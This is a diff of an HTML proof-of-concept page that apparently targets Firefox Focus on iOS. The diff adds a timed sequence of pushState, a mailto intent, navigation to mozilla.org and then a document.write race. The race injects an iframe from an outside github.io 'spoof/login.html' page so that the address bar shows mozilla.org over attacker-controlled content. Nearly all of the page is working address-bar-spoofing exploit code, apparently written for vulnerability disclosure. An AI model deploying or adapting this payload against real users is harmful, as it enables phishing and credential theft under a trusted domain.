@@ -2,52 +2,48 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>iOS External Intent Navigation State PoC</title>
+<title>Firefox Focus iOS External Intent PoC</title>
+<style>
+  body { font-family: sans-serif; }
+  .note { color: red; font-weight: bold; }
+</style>
 </head>
 <body>
 
 <button id="test">Trigger mailto intent</button>
-<div id="iframe-container" style="margin-top:20px;"></div>
 
 <script>
-let clickedOnce = false;
-
 document.getElementById('test').onclick = () => {
 
-  if (!clickedOnce) {
-    clickedOnce = true;
+  // Step 1: spoof visible URL (SPA-style)
+  history.pushState({}, '', '/expected-path');
 
-    // Step 1: change visible URL
-    history.pushState({}, '', '/expected-path');
+  // Step 2: external intent
+  setTimeout(() => {
+    location.href = 'mailto:test@example.com';
+  }, 300);
 
-    // Step 2: trigger external intent
-    setTimeout(() => {
-      location.href = 'mailto:tap again to mozila';
-    }, 300);
+  // Step 3: navigation that updates address bar to mozilla
+  setTimeout(() => {
+    location.href = 'https://www.mozilla.org';
+  }, 1200);
 
-    // Step 3: delayed navigation after intent
-    setTimeout(() => {
-      location.href = 'https://www.mozilla.org:8080';
-    }, 1200);
-
-  } else {
-    // Klik kedua → langsung ganti address bar dan tampilkan iframe
-    const targetURL = 'https://www.mozilla.org:8080';
-    
-    // Ganti address bar tanpa menambahkan entry baru di history
-    location.replace(targetURL);
-
-    // Buat iframe menampilkan konten yang sama
-    const container = document.getElementById('iframe-container');
-    container.innerHTML = ''; // reset iframe jika ada
-    const iframe = document.createElement('iframe');
-    iframe.src = targetURL;
-    iframe.style.width = '100%';
-    iframe.style.height = '500px';
-    iframe.style.border = '1px solid #ccc';
-    container.appendChild(iframe);
-  }
-
+  // Step 4: RACE — attempt to inject attacker-controlled content
+  setTimeout(() => {
+    try {
+      document.open();
+      document.write(`
+        <p class="note">
+          Demo: Address bar shows mozilla.org, but content below is attacker‑controlled.
+        </p>
+        <iframe
+          src="https://cnfdnfial-ops.github.io/spoof/login.html"
+          style="width:100%;height:420px;border:1px solid #ccc">
+        </iframe>
+      `);
+      document.close();
+    } catch (e) {}
+  }, 1250);
 };
 </script>
 
